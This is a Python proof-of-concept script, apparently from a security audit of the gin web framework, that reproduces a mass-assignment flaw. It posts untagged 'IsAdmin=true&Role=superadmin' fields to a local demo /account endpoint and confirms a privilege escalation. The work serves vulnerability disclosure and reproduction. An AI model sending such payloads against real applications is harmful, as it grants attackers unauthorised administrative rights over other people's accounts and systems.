#!/usr/bin/env python3
"""
VULN-004 — Reflection binder maps ALL exported fields (untagged ⇒ by field name) ⇒ mass assignment
==================================================================================================

Vulnerable code (targets/gin):
    binding/form_mapping.go:85       only `form:"-"` opts a field OUT
    binding/form_mapping.go:118-134  iterate EVERY exported struct field
    binding/form_mapping.go:149-154  tagValue=="" ⇒ bind by field.Name (untagged ⇒ by Go name)
    binding/json.go:25               DisallowUnknownFields=false (unknown keys silently ignored)

Class: CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) / mass assignment.

The flaw
--------
gin binds the ENTIRE exported field set of the destination struct from attacker input,
mapping tagless fields by their Go field name, with NO allowlist. Any field the developer
did not think to tag `form:"-"` is assignable. This is the classic Rails-CVE-2012-5664
mass-assignment class: bind straight into a persistence/domain model and the attacker sets
privileged fields (IsAdmin, Role, OwnerID) the form was never meant to expose.

Exploitation idea
------------------
The /account endpoint binds userModel{ Email `form:"email"`; IsAdmin (untagged); Role (untagged) }.
The intended form field is only `email`. Submit IsAdmin=true & Role=superadmin and they bind.

A successful run proves: attacker-supplied privileged fields are bound into the model with
no allowlist -> privilege escalation when the struct is a real user/account model.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, log, verdict, session, base_url, save  # noqa: E402

BASE = base_url(36275)                       # demo engine, /account binds into userModel


def main() -> int:
    banner("VULN-004", "reflection binder maps all exported fields -> mass assignment",
           BASE, "binding/form_mapping.go:149-154 (untagged field ⇒ bind by field.Name, no allowlist)")
    s = session()
    ct = {"Content-Type": "application/x-www-form-urlencoded"}

    # ---- STEP 1: legitimate request — only the intended `email` field.
    log("STEP", "legit: POST /account  body: email=user@example.com  (the only intended input)")
    ok = s.post(BASE + "/account", data="email=user@example.com", headers=ct).json()
    log("INFO", f"legit -> {ok}")

    # ---- STEP 2: mass assignment — add the privileged UNTAGGED fields by their Go names.
    # IsAdmin/Role have no form tag, so gin binds them from keys "IsAdmin"/"Role".
    log("STEP", "attack: POST /account  body: email=...&IsAdmin=true&Role=superadmin")
    j = s.post(BASE + "/account",
               data="email=attacker@example.com&IsAdmin=true&Role=superadmin", headers=ct).json()
    log("INFO", f"attack -> {j}")

    save(os.path.join(os.path.dirname(__file__), "request.http"),
         "POST /account HTTP/1.1\r\n"
         f"Host: {BASE.split('//',1)[1]}\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
         "email=attacker@example.com&IsAdmin=true&Role=superadmin\r\n")
    save(os.path.join(os.path.dirname(__file__), "response.txt"),
         f"legit  (email only):            {ok}\n"
         f"attack (email+IsAdmin+Role):    {j}\n")

    # ---- ASSERT: the privileged fields took the attacker's values (and were false/"" when omitted).
    escalated = j.get("IsAdmin") is True and j.get("Role") == "superadmin"
    baseline_safe = ok.get("IsAdmin") is False and ok.get("Role") in ("", None)
    if escalated and baseline_safe:
        log("PROOF", "untagged privileged fields bound from attacker input: IsAdmin=true, Role='superadmin' "
                     "(false/'' when not supplied) — no field allowlist")
        log("OK", "exploit confirmed — mass assignment: gin binds every exported field by name")
        return verdict("VULN-004", "CONFIRMED",
                       "IsAdmin/Role (untagged) mass-assigned from request body -> privilege escalation")
    log("FAIL", f"privileged fields not set as expected (attack={j}, legit={ok})")
    return verdict("VULN-004", "FAILED", "mass assignment not reproduced")


if __name__ == "__main__":
    sys.exit(main())
